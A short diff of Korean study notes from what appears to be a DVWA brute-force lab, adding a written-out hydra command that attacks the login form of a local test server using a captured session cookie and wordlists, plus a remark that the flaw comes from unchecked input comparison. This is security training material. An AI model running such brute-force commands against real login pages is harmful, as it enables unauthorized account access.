@@ -18,4 +18,8 @@
 ![[Pasted image 20241007095355.png]]hydra 192.168.56.118 http-form-get "/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:Username and/or password incorrect.:H=Cookie:security=low;PHPSESSID:aqsgn666ja2jubcdvc40euees2"
 ![[Pasted image 20241007100635.png]]
 - 취약한 아이디 리스트 / 패스워드 리스트 파일을 작성하고 명령어에 사용하도록 입력
-- 
+
+![[Pasted image 20241007100956.png]]
+- 서버의 취약점 원인
+- 보안과 관련된 코드 없이 사용자의 입력을 무조건 비교 확인하기 때문에 취약점이 발생한다.
+
